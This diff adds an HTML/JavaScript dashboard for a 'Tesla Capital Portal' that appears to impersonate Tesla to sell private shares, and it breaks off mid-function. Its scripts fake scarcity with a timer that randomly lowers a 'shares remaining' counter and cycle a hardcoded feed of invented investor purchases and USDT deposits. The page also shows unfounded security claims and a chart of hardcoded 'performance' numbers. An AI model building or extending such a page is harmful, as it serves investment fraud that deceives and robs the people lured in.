@@ -1,1 +1,630 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tesla Capital Portal - Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        body { background-color: #0d0d0d; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        .gradient-card { background: linear-gradient(135deg, #e82127 0%, #901115 100%); }
+        /* Hide scrollbars but preserve scrolling function */
+        ::-webkit-scrollbar { display: none; }
+    </style>
+</head>
+<body class="text-white min-h-screen pb-32">
+
+    <!-- Search Modal -->
+    <div id="searchModal" class="hidden fixed inset-0 bg-black/80 backdrop-blur-md z-50 flex flex-col pt-6 px-4 transition-all duration-200 opacity-0">
+        <div class="max-w-md w-full mx-auto space-y-4">
+            <div class="flex items-center space-x-3 bg-neutral-900 border border-neutral-800 rounded-xl px-3.5 py-2.5 shadow-xl">
+                <svg class="w-5 h-5 text-neutral-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
+                <input type="text" id="searchInput" placeholder="Search portal actions or assets..." class="bg-transparent w-full focus:outline-none text-sm text-neutral-200 placeholder-neutral-500">
+                <button id="closeSearchBtn" class="text-xs text-neutral-500 hover:text-white uppercase font-bold tracking-tight">Close</button>
+            </div>
+            
+            <div id="searchResults" class="bg-[#121212] border border-neutral-800/80 rounded-2xl overflow-hidden hidden max-h-80 overflow-y-auto divide-y divide-neutral-900 shadow-2xl">
+            </div>
+        </div>
+    </div>
+
+    <!-- Header -->
+    <header class="flex items-center justify-between px-6 py-4 border-b border-[#1c1c1c] bg-[#0d0d0d] sticky top-0 z-50">
+        <div class="flex items-center space-x-3">
+            <span class="text-xl font-bold tracking-widest text-[#E82127]">TESLA</span>
+        </div>
+        <div class="flex items-center space-x-4">
+            <button id="openSearchBtn" class="text-neutral-400 hover:text-white transition-colors active:scale-95">
+                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
+            </button>
+            
+            <div class="relative">
+                <button id="notiBellBtn" class="focus:outline-none relative block text-neutral-400 hover:text-white transition-colors active:scale-95">
+                    <span id="notiBadge" class="absolute -top-1 -right-1 bg-[#E82127] text-[10px] w-4 h-4 rounded-full flex items-center justify-center font-bold text-white transition-all">3</span>
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"/></svg>
+                </button>
+
+                <div id="notiMenu" class="hidden absolute right-0 mt-3 w-72 bg-[#121212] border border-[#262626] rounded-2xl shadow-2xl overflow-hidden z-40 transition-all transform scale-95 opacity-0 origin-top-right">
+                    <div class="px-4 py-3 border-b border-[#222] flex items-center justify-between">
+                        <span class="text-xs font-bold tracking-wider text-neutral-400 uppercase">Live Operations Terminal</span>
+                        <button onclick="clearSystemNotifications()" class="text-[9px] font-bold text-red-400 hover:text-red-500 uppercase tracking-tight">Clear All</button>
+                    </div>
+                    <div id="notiListContainer" class="divide-y divide-[#1c1c1c] max-h-64 overflow-y-auto">
+                        <div class="p-3.5 hover:bg-neutral-900/40 transition-colors flex items-start space-x-3">
+                            <span class="w-1.5 h-1.5 rounded-full bg-[#E82127] mt-1.5 shrink-0 animate-pulse"></span>
+                            <div>
+                                <p class="text-xs font-medium text-neutral-200">Allocation Settlement Cleared</p>
+                                <p class="text-[10px] text-neutral-500 mt-0.5 font-mono">Institutional node sync fully archived.</p>
+                            </div>
+                        </div>
+                        <div class="p-3.5 hover:bg-neutral-900/40 transition-colors flex items-start space-x-3">
+                            <span class="w-1.5 h-1.5 rounded-full bg-[#E82127] mt-1.5 shrink-0 animate-pulse"></span>
+                            <div>
+                                <p class="text-xs font-medium text-neutral-200">Security Vault Update</p>
+                                <p class="text-[10px] text-neutral-500 mt-0.5 font-mono">End-to-end cryptographic lock refreshed.</p>
+                            </div>
+                        </div>
+                        <div class="p-3.5 hover:bg-neutral-900/40 transition-colors flex items-start space-x-3">
+                            <span class="w-1.5 h-1.5 rounded-full bg-[#E82127] mt-1.5 shrink-0 animate-pulse"></span>
+                            <div>
+                                <p class="text-xs font-medium text-neutral-200">Global Share Tracking Active</p>
+                                <p class="text-[10px] text-neutral-500 mt-0.5 font-mono">Live ticker monitoring operational streams.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <a href="profile.html" class="flex items-center space-x-2 active:scale-95 transition-transform">
+                <div id="avatarContainer" class="w-8 h-8 rounded-full bg-neutral-800 border border-neutral-700 flex items-center justify-center text-xs font-bold text-neutral-300 overflow-hidden">PL</div>
+            </a>
+        </div>
+    </header>
+
+    <!-- Main Container -->
+    <main class="max-w-md mx-auto px-4 mt-4 space-y-5">
+        
+        <!-- Welcome Banner -->
+        <div class="relative rounded-2xl overflow-hidden h-32 bg-neutral-900 flex items-end p-4 border border-[#222]">
+            <div class="absolute inset-0 bg-cover bg-center opacity-40" style="background-image: url('https://images.unsplash.com/photo-1617788138017-80ad40651399?auto=format&fit=crop&q=80&w=600');"></div>
+            <div class="absolute inset-0 bg-gradient-to-t from-black via-black/50 to-transparent"></div>
+            <div class="relative z-10">
+                <h2 class="text-xl font-bold tracking-tight">Welcome back, <span id="userName" class="text-neutral-100">Investor</span></h2>
+                <p class="text-xs text-neutral-400 mt-0.5">Track. Invest. Grow.</p>
+            </div>
+        </div>
+
+        <!-- Available Shares Progress Pool -->
+        <div class="w-full bg-gradient-to-b from-[#161616] to-[#111111] border border-neutral-800 rounded-2xl p-4 shadow-xl">
+            <div class="flex items-center justify-between mb-2">
+                <div class="space-y-0.5">
+                    <h4 class="text-xs font-bold uppercase tracking-wider text-neutral-300">Private Liquidity Allocation</h4>
+                    <p class="text-[11px] text-red-400 font-medium tracking-tight">Only <span class="font-bold font-mono" id="sharesRemainingText">1,240</span> shares remaining out of 10,000</p>
+                </div>
+                <div class="text-right">
+                    <span class="text-xs font-black font-mono text-neutral-200" id="sharesPercentageText">87.6%</span>
+                    <p class="text-[9px] uppercase tracking-widest text-neutral-500 font-bold">Block Filled</p>
+                </div>
+            </div>
+            
+            <!-- Progress Track -->
+            <div class="w-full bg-neutral-900 border border-neutral-800 h-2.5 rounded-full overflow-hidden p-0.5">
+                <div id="sharesProgressBar" class="h-full rounded-full bg-gradient-to-r from-[#901115] to-[#E82127] shadow-[0_0_10px_rgba(232,33,39,0.4)] transition-all duration-1000 ease-out" style="width: 87.6%;"></div>
+            </div>
+            
+            <div class="flex items-center justify-between mt-2 text-[9px] text-neutral-500 font-mono font-medium">
+                <span>POOL STATUS: CRITICAL CAPACITY</span>
+                <span class="animate-pulse text-red-500 font-bold">● LIVE PRIVATE STREAM</span>
+            </div>
+        </div>
+
+        <!-- Live Premium Transactions Feed -->
+        <div class="w-full bg-[#141414] border border-[#222] rounded-2xl p-4 shadow-xl relative overflow-hidden">
+            <div class="flex items-center justify-between mb-2.5">
+                <div class="flex items-center space-x-2">
+                    <span class="flex h-2 w-2 relative">
+                        <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                        <span class="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
+                    </span>
+                    <span class="text-[10px] font-bold uppercase tracking-widest text-neutral-400">Live Activity Feed</span>
+                </div>
+                <span class="text-[9px] bg-[#E82127]/10 border border-[#E82127]/20 text-[#E82127] font-extrabold uppercase px-2 py-0.5 rounded-md tracking-wider">System Broadcaster</span>
+            </div>
+            <div class="bg-[#0d0d0d] border border-[#1f1f1f] rounded-xl px-4 py-3 min-h-[52px] flex items-center justify-between overflow-hidden relative">
+                <div id="liveActivityBox" class="flex items-center justify-between w-full transition-all duration-500 transform translate-y-0 opacity-100">
+                    <div class="flex items-center space-x-3 text-xs">
+                        <span class="text-emerald-500 font-bold font-mono">⚡</span>
+                        <p class="text-neutral-200 tracking-tight leading-snug" id="activityText">Investor ID ***482 just purchased 45 Tesla Shares (<span class="text-emerald-400 font-mono font-semibold">$2,500</span>)</p>
+                    </div>
+                    <span class="text-[10px] text-neutral-500 shrink-0 ml-4 font-medium font-mono" id="activityTime">2 mins ago</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Metric Cards -->
+        <div class="grid grid-cols-2 gap-4">
+            <div class="gradient-card rounded-2xl p-4 relative shadow-lg">
+                <p class="text-[10px] font-semibold uppercase tracking-wider text-red-200">Total Balance</p>
+                <h3 id="totalBalance" class="text-xl font-bold tracking-tight mt-1 text-white">Fetching...</h3>
+                <p class="text-[10px] text-red-200 font-medium mt-2 flex items-center">▲ 5.24% <span class="opacity-60 ml-1">vs last mo</span></p>
+            </div>
+
+            <div class="bg-[#141414] border border-[#222] rounded-2xl p-4 shadow-lg">
+                <p class="text-[10px] font-semibold uppercase tracking-wider text-neutral-500">Total Profit</p>
+                <h3 id="totalProfit" class="text-xl font-bold tracking-tight mt-1 text-white">Fetching...</h3>
+                <p class="text-[10px] text-emerald-400 font-medium mt-2 flex items-center">▲ 8.45% <span class="text-neutral-600 ml-1">vs last mo</span></p>
+            </div>
+        </div>
+
+        <!-- Quick Links Grid -->
+        <div class="grid grid-cols-3 gap-2.5">
+            <a href="invest.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95">
+                <span class="text-neutral-400 text-sm font-medium">Invest</span>
+            </a>
+            <a href="withdraw.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95">
+                <span class="text-neutral-400 text-sm font-medium">Withdraw</span>
+            </a>
+            <a href="send.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95">
+                <span class="text-neutral-400 text-sm font-medium">Send</span>
+            </a>
+            <a href="buyshare.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95">
+                <span class="text-neutral-400 text-sm font-medium">Buy Share</span>
+            </a>
+            <a href="receive.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95">
+                <span class="text-neutral-400 text-sm font-medium">Receive</span>
+            </a>
+            <a href="bills.html" class="bg-[#141414] border border-[#1f1f1f] rounded-xl py-3 flex flex-col items-center justify-center transition-all active:scale-95">
+                <span class="text-neutral-400 text-sm font-medium">Bills</span>
+            </a>
+        </div>
+
+        <!-- Network Status Banner -->
+        <div class="bg-[#141414] border border-neutral-800/60 rounded-xl p-3 flex items-center justify-center space-x-2.5 shadow-md">
+            <span class="text-emerald-500 text-xs">🛡️</span>
+            <p class="text-[10px] text-neutral-400 font-medium tracking-tight">
+                Secure Network Status: <span class="text-emerald-400 font-bold">100% Operational</span> | End-to-End Encryption Secured
+            </p>
+        </div>
+
+        <!-- Chart Card (Updated) -->
+        <div class="bg-[#141414] border border-[#222] rounded-2xl p-4 space-y-3 shadow-xl">
+            <div class="flex items-center justify-between">
+                <div>
+                    <h4 class="text-xs font-bold uppercase tracking-wider text-neutral-400">Tesla Performance</h4>
+                    <p class="text-[10px] text-neutral-500">Live share valuation history</p>
+                </div>
+                <div class="flex items-center space-x-1.5 bg-red-950/40 px-2 py-0.5 rounded-full border border-red-900/30">
+                    <span class="w-1.5 h-1.5 rounded-full bg-[#E82127] animate-pulse"></span>
+                    <span class="text-[9px] text-red-400 font-bold tracking-tight uppercase">Live</span>
+                </div>
+            </div>
+            <div class="relative w-full h-36">
+                <canvas id="deliveryChart"></canvas>
+            </div>
+        </div>
+
+        <!-- Doughnut Allocation Card -->
+        <div class="bg-[#141414] border border-[#222] rounded-2xl p-4 space-y-3 shadow-xl">
+            <h4 class="text-xs font-bold uppercase tracking-wider text-neutral-400">Asset Allocation</h4>
+            <div class="flex items-center justify-between">
+                <div class="relative w-[110px] h-[110px]">
+                    <canvas id="portfolioChart"></canvas>
+                </div>
+                <div class="flex-1 pl-6 space-y-2">
+                    <div class="flex items-center justify-between text-xs">
+                        <div class="flex items-center space-x-2">
+                            <span class="w-2.5 h-2.5 rounded-full bg-[#E82127]"></span>
+                            <span class="text-neutral-400 text-[11px]">Tesla Shares</span>
+                        </div>
+                        <span class="font-bold text-neutral-200">70%</span>
+                    </div>
+                    <div class="flex items-center justify-between text-xs">
+                        <div class="flex items-center space-x-2">
+                            <span class="w-2.5 h-2.5 rounded-full bg-[#3d3d3d]"></span>
+                            <span class="text-neutral-400 text-[11px]">Liquid Cash</span>
+                        </div>
+                        <span class="font-bold text-neutral-200">20%</span>
+                    </div>
+                    <div class="flex items-center justify-between text-xs">
+                        <div class="flex items-center space-x-2">
+                            <span class="w-2.5 h-2.5 rounded-full bg-[#8f8f8f]"></span>
+                            <span class="text-neutral-400 text-[11px]">Other Assets</span>
+                        </div>
+                        <span class="font-bold text-neutral-200">10%</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Watchlist Widget -->
+        <div class="bg-[#141414] border border-[#222] rounded-2xl p-4 space-y-4">
+            <h4 class="text-xs font-bold uppercase tracking-wider text-neutral-400">Futures & Watchlist</h4>
+            <div class="space-y-3">
+                <div class="flex items-center justify-between border-b border-neutral-900 pb-2">
+                    <div>
+                        <p class="text-sm font-bold">TSLA</p>
+                        <p class="text-[10px] text-neutral-500">Tesla, Inc.</p>
+                    </div>
+                    <div class="text-right">
+                        <p class="text-sm font-bold text-neutral-200">$254.85</p>
+                        <p class="text-[10px] text-emerald-400 font-medium">+5.13%</p>
+                    </div>
+                </div>
+                <div class="flex items-center justify-between">
+                    <div>
+                        <p class="text-sm font-bold">NASDAQ 100</p>
+                        <p class="text-[10px] text-neutral-500">NQ FUT</p>
+                    </div>
+                    <div class="text-right">
+                        <p class="text-sm font-bold text-neutral-200">18,892.25</p>
+                        <p class="text-[10px] text-emerald-400 font-medium">+0.51%</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Frame Footer Accent Banner -->
+        <div class="relative rounded-2xl overflow-hidden p-5 border border-red-900/30 bg-gradient-to-r from-neutral-950 via-[#180506] to-neutral-950 shadow-inner group">
+            <div class="absolute top-0 right-0 p-3 opacity-20 text-red-600 transition-transform duration-700 group-hover:rotate-12">
+                <svg class="w-20 h-20" fill="currentColor" viewBox="0 0 24 24">
+                    <path d="M18.4 10.1C16.9 7.3 14 5.5 10.7 5.5c-4.4 0-8 3.3-8.5 7.6h2.1c.5-3.2 3.2-5.6 6.4-5.6 2.4 0 4.6 1.3 5.7 3.3l-2.6 1.3h6.7V5.5l-2.1 4.6z"/>
+                </svg>
+            </div>
+            <div class="relative z-10 space-y-1.5 max-w-[75%]">
+                <span class="text-[9px] font-bold text-[#E82127] uppercase tracking-widest bg-red-950/60 px-2 py-0.5 rounded-md border border-red-900/40">Exclusive Framework</span>
+                <h3 class="text-sm font-bold tracking-tight text-white mt-1">The Future is Electric</h3>
+                <p class="text-[10px] text-neutral-400 leading-normal">Accelerating sustainable energy expansion via decentralized institutional retail capital asset pipelines.</p>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- Bottom Navigation Bar -->
+    <div class="fixed bottom-4 left-4 right-4 bg-[#141414]/90 backdrop-blur-md border border-[#222] h-16 rounded-2xl shadow-2xl flex items-center justify-between px-2 z-50 max-w-md mx-auto">
+        <a href="dashboard.html" class="flex flex-col items-center justify-center flex-1 py-1 text-[#E82127]">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"></path>
+            </svg>
+            <span class="text-[9px] font-bold mt-1 tracking-tight">Home</span>
+        </a>
+        <a href="settings.html" class="flex flex-col items-center justify-center flex-1 py-1 text-neutral-400 hover:text-white transition-colors">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path>
+                <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
+            </svg>
+            <span class="text-[9px] font-medium mt-1 tracking-tight">Settings</span>
+        </a>
+        <a href="messages.html" class="flex flex-col items-center justify-center flex-1 py-1 text-neutral-400 hover:text-white transition-colors relative">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 002 2v10a2 2 0 002 2z"></path>
+            </svg>
+            <span class="absolute top-1 right-5 bg-[#E82127] text-white text-[8px] font-bold w-3.5 h-3.5 rounded-full flex items-center justify-center border border-[#141414]">3</span>
+            <span class="text-[9px] font-medium mt-1 tracking-tight">Messages</span>
+        </a>
+        <a href="about.html" class="flex flex-col items-center justify-center flex-1 py-1 text-neutral-400 hover:text-white transition-colors">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+            </svg>
+            <span class="text-[9px] font-medium mt-1 tracking-tight">About</span>
+        </a>
+        <a href="#" id="logoutBtn" class="flex flex-col items-center justify-center flex-1 py-1 text-neutral-500 hover:text-red-400 transition-colors">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path>
+            </svg>
+            <span class="text-[9px] font-medium mt-1 tracking-tight">Exit</span>
+        </a>
+    </div>
+
+    <script>
+        const API_URL = "https://script.google.com/macros/s/AKfycbxMvLEjQRlW8Gveer2mNJf-bnoFsXLVb0wjNdcGkujWwnLVzTf2iDCQI19yVUTi0rtG5w/exec";
+        const userId = localStorage.getItem("userId");
+        const fullName = localStorage.getItem("fullName");
+
+        document.getElementById("logoutBtn").addEventListener("click", (e) => {
+            e.preventDefault();
+            localStorage.removeItem("userId");
+            localStorage.removeItem("fullName");
+            localStorage.removeItem("userAvatarImage");
+            window.location.href = "index.html";
+        });
+
+        const searchDatabase = [
+            { name: "Tesla Stock Shares (TSLA)", url: "buyshare.html", category: "Assets" },
+            { name: "Invest Capital Assets", url: "invest.html", category: "Operations" },
+            { name: "Withdrawal System Portal", url: "withdraw.html", category: "Operations" },
+            { name: "Send Cryptographic Assets", url: "send.html", category: "Operations" },
+            { name: "Receive Assets Network", url: "receive.html", category: "Operations" },
+            { name: "Bills & Institutional Invoices", url: "bills.html", category: "Operations" },
+            { name: "Account Profile & Bio Settings", url: "profile.html", category: "System" },
+            { name: "System Interface Adjustments", url: "settings.html", category: "System" },
+            { name: "Secure Message Terminal", url: "messages.html", category: "Communication" }
+        ];
+
+        const openSearchBtn = document.getElementById("openSearchBtn");
+        const closeSearchBtn = document.getElementById("closeSearchBtn");
+        const searchModal = document.getElementById("searchModal");
+        const searchInput = document.getElementById("searchInput");
+        const searchResults = document.getElementById("searchResults");
+
+        openSearchBtn.addEventListener("click", () => {
+            searchModal.classList.remove("hidden");
+            setTimeout(() => {
+                searchModal.classList.remove("opacity-0");
+                searchModal.classList.add("opacity-100");
+                searchInput.focus();
+            }, 50);
+            renderSearchResults(""); 
+        });
+
+        function closeSearchModal() {
+            searchModal.classList.remove("opacity-100");
+            searchModal.classList.add("opacity-0");
+            setTimeout(() => {
+                searchModal.classList.add("hidden");
+                searchInput.value = "";
+            }, 200);
+        }
+        closeSearchBtn.addEventListener("click", closeSearchModal);
+
+        searchInput.addEventListener("input", (e) => {
+            renderSearchResults(e.target.value);
+        });
+
+        function initializePrivatePoolCounter() {
+            let runningShares = 1240;
+            const totalShares = 10000;
+            const textEl = document.getElementById('sharesRemainingText');
+            const percentEl = document.getElementById('sharesPercentageText');
+            const barEl = document.getElementById('sharesProgressBar');
+
+            function updatePoolUI() {
+                textEl.innerText = runningShares.toLocaleString();
+                const precisionFilledPercent = (((totalShares - runningShares) / totalShares) * 100).toFixed(1);
+                percentEl.innerText = `${precisionFilledPercent}%`;
+                barEl.style.width = `${precisionFilledPercent}%`;
+            }
+
+            function subtractRandomShares() {
+                const customDelay = Math.floor(Math.random() * (15000 - 8000 + 1)) + 8000;
+                setTimeout(() => {
+                    if (runningShares > 184) {
+                        const chunksToSubtract = Math.floor(Math.random() * 8) + 2;
+                        runningShares -= chunksToSubtract;
+                        updatePoolUI();
+                    }
+                    subtractRandomShares();
+                }, customDelay);
+            }
+
+            updatePoolUI();
+            subtractRandomShares();
+        }
+
+        function renderSearchResults(query) {
+            const cleanQuery = query.toLowerCase().trim();
+            const filtered = searchDatabase.filter(item => item.name.toLowerCase().includes(cleanQuery));
+
+            if (filtered.length === 0) {
+                searchResults.innerHTML = `<div class="p-4 text-center text-xs text-neutral-500 font-mono">No matching network records found.</div>`;
+            } else {
+                searchResults.innerHTML = filtered.map(item => `
+                    <a href="${item.url}" class="flex items-center justify-between p-3.5 hover:bg-neutral-900/60 transition-colors group">
+                        <span class="text-xs text-neutral-200 font-medium group-hover:text-white">${item.name}</span>
+                        <span class="text-[9px] bg-neutral-900 border border-neutral-800 text-neutral-500 font-mono tracking-wider px-2 py-0.5 rounded-md uppercase">${item.category}</span>
+                    </a>
+                `).join('');
+            }
+            searchResults.classList.remove("hidden");
+        }
+
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        function playPremiumChime(isClearAction) {
+            try {
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.type = 'sine';
+                if(isClearAction) {
+                    osc.frequency.setValueAtTime(520, audioCtx.currentTime);
+                    osc.frequency.exponentialRampToValueAtTime(220, audioCtx.currentTime + 0.25);
+                } else {
+                    osc.frequency.setValueAtTime(880, audioCtx.currentTime);
+                }
+                gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + 0.25);
+                osc.start();
+                osc.stop(audioCtx.currentTime + 0.25);
+            } catch(e){}
+        }
+
+        const notiBellBtn = document.getElementById("notiBellBtn");
+        const notiMenu = document.getElementById("notiMenu");
+
+        notiBellBtn.addEventListener("click", (e) => {
+            e.stopPropagation();
+            if(notiMenu.classList.contains("hidden")) {
+                playPremiumChime(false);
+                notiMenu.classList.remove("hidden");
+                setTimeout(() => {
+                    notiMenu.classList.remove("scale-95", "opacity-0");
+                    notiMenu.classList.add("scale-100", "opacity-100");
+                }, 10);
+            } else {
+                closeNotiMenu();
+            }
+        });
+
+        function closeNotiMenu() {
+            notiMenu.classList.remove("scale-100", "opacity-100");
+            notiMenu.classList.add("scale-95", "opacity-0");
+            setTimeout(() => notiMenu.classList.add("hidden"), 150);
+        }
+
+        document.addEventListener("click", (e) => {
+            if(!notiMenu.contains(e.target) && e.target !== notiBellBtn) {
+                if(!notiMenu.classList.contains("hidden")) closeNotiMenu();
+            }
+        });
+
+        function clearSystemNotifications() {
+            playPremiumChime(true);
+            document.getElementById("notiListContainer").innerHTML = `
+                <div class="p-6 text-center text-neutral-600 text-[10px] uppercase font-mono tracking-wider">
+                    Terminal Log Clear // 0 Messages
+                </div>`;
+            const badge = document.getElementById("notiBadge");
+            if (badge) {
+                badge.classList.add("scale-0", "opacity-0");
+                setTimeout(() => badge.remove(), 200);
+            }
+        }
+
+        if (!userId) {
+            window.location.href = "index.html";
+        } else {
+            document.getElementById('userName').innerText = fullName || "Investor";
+            const savedAvatar = localStorage.getItem("userAvatarImage");
+            if (savedAvatar) {
+                document.getElementById('avatarContainer').innerHTML = `<img src="${savedAvatar}" class="w-full h-full object-cover">`;
+            } else if (fullName) {
+                const initials = fullName.split(" ").map(n => n[0]).join("").toUpperCase().substring(0, 2);
+                document.getElementById('avatarContainer').innerText = initials;
+            }
+            loadDashboardMetrics();
+            initializePremiumCharts();
+            initializeLiveActivityFeed();
+            initializePrivatePoolCounter();
+        }
+
+        function formatCurrency(val) {
+            const num = parseFloat(String(val).replace(/[^0-9.-]+/g,"")) || 0;
+            return new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(num);
+        }
+
+        async function loadDashboardMetrics() {
+            try {
+                const response = await fetch(API_URL, {
+                    method: "POST",
+                    mode: "cors",
+                    headers: { "Content-Type": "text/plain" },
+                    body: JSON.stringify({ action: "getDashboardData", userId: userId })
+                });
+                const result = await response.json();
+                if (result.status === "success") {
+                    document.getElementById('totalBalance').innerText = formatCurrency(result.account.balance);
+                    document.getElementById('totalProfit').innerText = formatCurrency(result.account.profit);
+                } else {
+                    document.getElementById('totalBalance').innerText = "Error";
+                    document.getElementById('totalProfit').innerText = "Error";
+                }
+            } catch (err) {
+                document.getElementById('totalBalance').innerText = "Disconnected";
+                document.getElementById('totalProfit').innerText = "Disconnected";
+            }
+        }
+
+        function initializePremiumCharts() {
+            // Glowing Line Chart
+            const ctxLine = document.getElementById('deliveryChart').getContext('2d');
+            const gradient = ctxLine.createLinearGradient(0, 0, 0, 150);
+            gradient.addColorStop(0, 'rgba(232, 33, 39, 0.3)');
+            gradient.addColorStop(1, 'rgba(232, 33, 39, 0)');
+
+            new Chart(ctxLine, {
+                type: 'line',
+                data: {
+                    labels: ['JUL 10', 'AUG', 'SEP', 'OCT 11', 'NOV', 'DEC', 'JAN', 'FEB 13'],
+                    datasets: [{
+                        data: [1000, 1200, 1100, 1500, 1400, 1800, 2500, 4228],
+                        borderColor: '#E82127',
+                        borderWidth: 3,
+                        tension: 0.4,
+                        fill: true,
+                        backgroundColor: gradient,
+                        pointRadius: 0,
+                        borderCapStyle: 'round'
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    animation: { duration: 2000, easing: 'easeInOutQuart' },
+                    plugins: { legend: { display: false } },
+                    scales: {
+                        x: { grid: { display: false }, ticks: { color: '#666', font: { size: 10 } } },
+                        y: { grid: { color: '#1a1a1a' }, ticks: { color: '#666', font: { size: 9 }, maxTicksLimit: 4 } }
+                    }
+                }
+            });
+
+            // Doughnut Allocation
+            const ctxDonut = document.getElementById('portfolioChart').getContext('2d');
+            new Chart(ctxDonut, {
+                type: 'doughnut',
+                data: {
+                    labels: ['Tesla Shares', 'Liquid Cash', 'Other Assets'],
+                    datasets: [{
+                        data: [70, 20, 10],
+                        backgroundColor: ['#E82127', '#2a2a2a', '#5c5c5c'],
+                        borderWidth: 0,
+                        hoverOffset: 4
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    cutout: '72%',
+                    plugins: { legend: { display: false } }
+                }
+            });
+        }
+
+        function initializeLiveActivityFeed() {
+            const feedData = [
+                { text: 'Investor ID ***482 just purchased 45 Tesla Shares (<span class="text-emerald-400 font-mono font-semibold">$2,500</span>)', time: '2 mins ago' },
+                { text: 'Investor ID ***911 withdrew <span class="text-neutral-400 font-mono font-semibold">$1,400</span> to Bank Account', time: '12 mins ago' },
+                { text: 'Investor ID ***104 added position capital pipeline (<span class="text-emerald-400 font-mono font-semibold">$10,250</span> via USDT)', time: 'Just now' },
+                { text: 'Investor ID ***661 secured 15 fractional equities (<span class="text-emerald-400 font-mono font-semibold">$850</span>)', time: '4 mins ago' },
+                { text: 'Investor ID ***319 clearing system payout of <span class="text-neutral-400 font-mono font-semibold">$4,100</span> complete', time: '22 mins ago' },
+                { text: 'Investor ID ***882 initialized institutional collateral allocation (<span class="text-emerald-400 font-mono font-semibold">$15,000</span>)', time: '1 min ago' }
+            ];
+
+            const containerBox = document.getElementById('liveActivityBox');
+            const textBox = document.getElementById('activityText');
+            const timeBox = document.getElementById('activityTime');
+            let currentIndex = 0;
+
+            function cycleFeed() {
+                containerBox.classList.remove('translate-y-0', 'opacity-100');
+                containerBox.classList.add('-translate-y-2', 'opacity-0');
+
+                setTimeout(() => {
